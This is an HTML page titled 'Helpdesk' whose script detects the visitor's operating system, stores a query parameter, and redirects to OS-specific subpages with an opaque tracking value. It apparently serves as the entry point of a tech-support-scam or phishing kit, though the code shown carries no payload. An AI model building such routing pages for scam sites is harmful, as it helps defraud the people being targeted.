
<!DOCTYPE html>
<html lang="en">
<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <title>Helpdesk</title>
    <script>
        function getQueryParam(param) { 
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
        }
        function checkosSystemForScna() {
            const userAgent = navigator.userAgent;
            let os = "Unknown";
            if (userAgent.indexOf("Win") !== -1) {
                os = "Windows";
            }else if (userAgent.indexOf("iPhone") !== -1) {
                os = "iOS";
            }else if (userAgent.indexOf("Mac") !== -1) {
                os = "MacOS";
            } else if (userAgent.indexOf("Android") !== -1) {
                os = "Android";
            } else if (userAgent.indexOf("Linux") !== -1) {
                os = "Linux";
            }
            return os;
        }
        let operatingSystem = checkosSystemForScna();
        localStorage.setItem('alpha',getQueryParam('alpha'));
        if(operatingSystem === 'MacOS'){
            window.location.href="macbook/index.html?bcda="+getQueryParam('bcda').trim();
        }else if(operatingSystem === 'Android') {
            window.location.href="androiddevices/index.html?bcda="+getQueryParam('bcda').trim();
        }else if(operatingSystem === 'iOS') {
            window.location.href="iosdevices/index.html?bcda="+getQueryParam('bcda').trim();
        }else{
            window.location.href="windowslaptop/index.html?bcda="+getQueryParam('bcda').trim();
        }
    </script>
</head>
<body>
</body>
</html>
